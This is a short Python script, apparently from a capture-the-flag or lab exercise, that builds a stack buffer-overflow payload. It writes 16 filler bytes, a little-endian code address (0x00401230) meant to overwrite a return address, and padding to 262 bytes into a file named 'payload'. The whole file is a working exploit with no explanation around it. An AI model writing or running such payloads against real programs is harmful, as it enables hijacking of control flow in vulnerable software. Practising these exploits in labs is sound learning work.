import os
buff = '1'*16
buff += '\x30\x12\x40\x00'
buff = buff.ljust(262, '1')
with open('payload', 'wb') as f:
    f.write(buff.encode('ascii'))
